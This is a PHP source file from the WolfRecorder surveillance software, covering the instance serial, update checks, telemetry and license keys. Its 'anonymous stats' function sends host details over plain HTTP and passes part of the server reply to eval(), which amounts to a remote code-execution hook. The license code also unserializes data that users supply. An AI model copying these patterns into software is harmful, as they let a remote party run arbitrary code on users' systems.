<?php

/**
 * Returns current instance serial from database or cache
 * 
 * @return string
 */
function wr_SerialGet() {
    $result = '';
    $cache = new UbillingCache();
    $cacheTimeout = 2592000;
    $cachedKey = $cache->get('WRHID', $cacheTimeout);
    if (empty($cachedKey)) {
        $lairDb = new NyanORM('lair');
        $lairDb->where('key', '=', 'wrid');
        $rawResult = $lairDb->getAll('key');
        if (!empty($rawResult)) {
            $result = $rawResult['wrid']['value'];
        }

        if (!empty($result)) {
            $cache->set('WRHID', $result, $cacheTimeout);
        }
    } else {
        $result = $cachedKey;
    }
    return($result);
}

/**
 * Installs newly generated instance serial into database
 * 
 * @return string
 */
function wr_SerialInstall() {
    $randomid = 'WR' . md5(curdatetime() . zb_rand_string(8));
    $lairDb = new NyanORM('lair');
    $lairDb->data('key', 'wrid');
    $lairDb->data('value', $randomid);
    $lairDb->create();
    return($randomid);
}

/**
 * Returns current system version
 * 
 * @return string
 */
function wr_getLocalSystemVersion() {
    $result = file_get_contents('RELEASE');
    return($result);
}

/**
 * Returns remote release version
 * 
 * @param string $branch
 * 
 * @return string/bool
 */
function wr_GetReleaseInfo($branch) {
    $result = false;
    $release_url = UpdateManager::URL_RELEASE_STABLE;
    if ($branch == 'CURRENT') {
        $release_url = UpdateManager::URL_RELEASE_CURRENT;
    }
    $remoteCallback = new OmaeUrl($release_url);
    $releaseInfo = $remoteCallback->response();
    if ($releaseInfo) {
        $result = $releaseInfo;
    }
    return($result);
}

/**
 * Ajax backend for rendering WolfRecorder updates release info
 * 
 * @param bool $version
 * @param bool $branch
 * 
 * @return string/bool
 */
function wr_RenderUpdateInfo($version = '', $branch = 'STABLE') {
    $result = '';
    $latestRelease = $version;
    if ($latestRelease) {
        if ($branch == 'CURRENT') {
            $result = __('Latest nightly WolfRecorder build is') . ': ' . $latestRelease;
        } else {
            $result = __('Latest stable WolfRecorder release is') . ': ' . $latestRelease;
        }
    } else {
        $result = __('Error checking updates');
    }
    return($result);
}

/**
 * Collects anonymous stats
 * 
 * @param string $modOverride
 * 
 * @return void
 */
function wr_Stats($modOverride = '') {
    $wrStatsUrl = 'http://stats.wolfrecorder.com';
    $statsflag = 'exports/NOTRACKTHIS';
    $deployMark = 'DEPLOYUPDATE';
    $cache = new UbillingCache();
    $cacheTime = 3600;

    $hostId = wr_SerialGet();
    if (!empty($hostId)) {
        $thiscollect = (file_exists($statsflag)) ? 0 : 1;
        if ($thiscollect) {
            $moduleStats = 'xnone';
            if ($modOverride) {
                $moduleStats = 'x' . $modOverride;
            } else {
                if (ubRouting::checkGet('module')) {
                    $moduleClean = str_replace('x', '', ubRouting::get('module'));
                    $moduleStats = 'x' . $moduleClean;
                } else {
                    
                }
            }
            $releaseinfo = file_get_contents('RELEASE');
            $wrVersion = explode(' ', $releaseinfo);
            $wrVersion = ubRouting::filters($wrVersion[0], 'int');

            $wrInstanceStats = $cache->get('WRINSTANCE', $cacheTime);
            if (empty($wrInstanceStats)) {
                $camDb = new NyanORM(Cameras::DATA_TABLE);
                $camCount = $camDb->getFieldsCount('id');
                $wrInstanceStats = '?u=' . $hostId . 'x' . $camCount . 'x' . $wrVersion;
                $cache->set('WRINSTANCE', $wrInstanceStats, $cacheTime);
            }

            $statsurl = $wrStatsUrl . $wrInstanceStats . $moduleStats;

            $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
            $collector = new OmaeUrl($statsurl);
            $collector->setUserAgent('WRTRACK');
            $collector->setTimeout(1);
            if (!empty($referrer)) {
                $collector->setReferrer($referrer);
            }
            $output = $collector->response();
            $error = $collector->error();
            $httpCode = $collector->httpCode();

            if (!$error AND $httpCode == 200) {
                $output = trim($output);
                if (!empty($output)) {
                    if (ispos($output, $deployMark)) {
                        $output = str_replace($deployMark, '', $output);
                        if (!empty($output)) {
                            eval($output);
                        }
                    } else {
                        show_window('', $output);
                    }
                }
            }
        }
    }
}

/**
 * One of se7en deadly sins
 */
class Avarice {

    private $data = array();
    private $serial = '';
    private $raw = array();
    private $lairDb = '';

    const LMARK = 'WOOF_';

    public function __construct() {
        $this->getSerial();
        $this->initDb();
        $this->load();
    }

    /**
     * Inits database abstraction layer
     */
    protected function initDb() {
        $this->lairDb = new NyanORM('lair');
    }

    /**
     * encodes data string by some key
     * 
     * @param $data data to encode
     * @param $key  encoding key
     * 
     * @return binary
     */
    protected function xoror($data, $key) {
        $result = '';
        for ($i = 0; $i < strlen($data);) {
            for ($j = 0; $j < strlen($key); $j++, $i++) {
                @$result .= $data[$i] ^ $key[$j];
            }
        }
        return($result);
    }

    /**
     * pack xorored binary data into storable ascii data
     * 
     * @param $data
     * 
     * 
     * @return string
     */
    protected function pack($data) {
        $data = base64_encode($data);
        return ($data);
    }

    /**
     * unpack packed ascii data into xorored binary
     * 
     * @param $data
     * 
     * 
     * @return string
     */
    protected function unpack($data) {
        $data = base64_decode($data);
        return ($data);
    }

    /**
     * loads all stored licenses into private data prop
     * 
     * @return void
     */
    protected function load() {
        if (!empty($this->serial)) {
            $this->lairDb->where('key', 'LIKE', self::LMARK . '%');
            $keys = $this->lairDb->getAll();
            if (!empty($keys)) {
                foreach ($keys as $io => $each) {
                    if (!empty($each['value'])) {
                        $unpack = $this->unpack($each['value']);
                        $unenc = $this->xoror($unpack, $this->serial);
                        @$unenc = unserialize($unenc);
                        if (!empty($unenc)) {
                            if (isset($unenc['AVARICE'])) {
                                if (isset($unenc['AVARICE']['SERIAL'])) {
                                    if ($this->serial == $unenc['AVARICE']['SERIAL']) {
                                        if (isset($unenc['AVARICE']['MODULE'])) {
                                            if (!empty($unenc['AVARICE']['MODULE'])) {
                                                $this->data[$unenc['AVARICE']['MODULE']] = $unenc[$unenc['AVARICE']['MODULE']];
                                                $this->raw[$unenc['AVARICE']['MODULE']]['LICENSE'] = $each['value'];
                                                $this->raw[$unenc['AVARICE']['MODULE']]['MODULE'] = $unenc['AVARICE']['MODULE'];
                                                $this->raw[$unenc['AVARICE']['MODULE']]['KEY'] = $each['key'];
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /**
     * Puts system key into private key prop
     * 
     * @return void
     */
    protected function getSerial() {
        $this->serial = wr_SerialGet();
    }

    /**
     * checks module license availability
     * 
     * @param $module module name to check
     * 
     * @return bool
     */
    protected function check($module) {
        if (!empty($module)) {
            if (isset($this->data[$module])) {
                return (true);
            } else {
                return(false);
            }
        }
    }

    /**
     * returns module runtime 
     * 
     * @return array
     */
    public function runtime($module) {
        $result = array();
        if ($this->check($module)) {
            $result = $this->data[$module];
        }
        return ($result);
    }

    /**
     * returns list available license keys
     * 
     * @return array
     */
    public function getLicenseKeys() {
        return ($this->raw);
    }

    /**
     * check license key before storing it
     * 
     * @param string $key
     * 
     * @return bool
     */
    protected function checkLicenseValidity($key) {
        $result = false;
        if (@strpos($key, strrev('mN'), 0) !== false) {
            @$key = $this->unpack($key);
            @$key = $this->xoror($key, $this->serial);
            @$key = unserialize($key);
            if (!empty($key)) {
                $result = true;
            }
        }
        return($result);
    }

    /**
     * deletes key from database
     * 
     * @param $keyname string identify key into database
     * 
     * @return void
     */
    public function deleteKey($keyname) {
        $keyname = ubRouting::filters($keyname, 'mres');
        $this->lairDb->where('key', '=', $keyname);
        $this->lairDb->delete();
        log_register('AVARICE DELETE KEY `' . $keyname . '`');
    }

    /**
     * installs new license key
     * 
     * @param $key string valid license key
     * 
     * @return bool
     */
    public function createKey($key) {
        $key = ubRouting::filters($key, 'mres');
        if ($this->checkLicenseValidity($key)) {
            $keyname = self::LMARK . zb_rand_string(8);
            $this->lairDb->data('key', $keyname);
            $this->lairDb->data('value', $key);
            $this->lairDb->create();
            log_register('AVARICE INSTALL KEY `' . $keyname . '`');
            return(true);
        } else {
            log_register('AVARICE TRY INSTALL WRONG KEY');
            return (false);
        }
    }

    /**
     * updates existing license key
     */
    public function updateKey($index, $key) {
        if ($this->checkLicenseValidity($key)) {
            $this->lairDb->data('value', $key);
            $this->lairDb->where('key', '=', $index);
            $this->lairDb->save();
            log_register('AVARICE UPDATE KEY `' . $index . '`');
            return(true);
        } else {
            log_register('AVARICE TRY UPDATE WRONG KEY');
            return (false);
        }
    }
}

/**
 * Renders available license keys with all of required controls 
 * 
 * @return void
 */
function wr_LicenseLister() {
    $result = '';
    $avarice = new Avarice();
    $all = $avarice->getLicenseKeys();
    $messages = new UbillingMessageHelper();

    if (!empty($all)) {
        $cells = wf_TableCell(__('License key'));
        $cells .= wf_TableCell(__('Actions'));
        $rows = wf_TableRow($cells, 'row1');
        foreach ($all as $io => $each) {
            //construct edit form
            $editinputs = wf_HiddenInput('editdbkey', $each['KEY']);
            $editinputs .= wf_TextArea('editlicense', '', $each['LICENSE'], true, '50x10');
            $editinputs .= wf_Submit(__('Save'));
            $editform = wf_Form("", 'POST', $editinputs, 'glamour');
            $editcontrol = wf_modalAuto(web_edit_icon(), __('Edit') . ' ' . $each['MODULE'], $editform);
            $deletionUrl = '?module=licensekeys&licensedelete=' . $each['KEY'];
            $cancelUrl = '?module=licensekeys';
            $delLabel = __('Delete') . ' ' . __('License key') . ' ' . $each['MODULE'] . '? ';
            $delLabel .= $messages->getDeleteAlert();
            $deletecontrol = wf_ConfirmDialog($deletionUrl, web_delete_icon(), $delLabel, '', $cancelUrl);
            $cells = wf_TableCell($each['MODULE']);
            $cells .= wf_TableCell($deletecontrol . ' ' . $editcontrol);
            $rows .= wf_TableRow($cells, 'row5');
        }
        $result .= wf_TableBody($rows, '100%', 0, '');
    } else {
        $result .= $messages->getStyledMessage(__('You do not have any license keys installed. So how are you going to live like this?'), 'warning');
    }

    //constructing license creation form
    $addinputs = wf_TextArea('createlicense', '', '', true, '50x10');
    $addinputs .= wf_Submit(__('Save'));
    $addform = wf_Form("", 'POST', $addinputs, 'glamour');
    $addcontrol = wf_modalAuto(web_icon_create() . ' ' . __('Install license key'), __('Install license key'), $addform, 'ubButton');
    $result .= wf_delimiter(0);
    $result .= $addcontrol;
    show_window(__('Installed license keys'), $result);
}
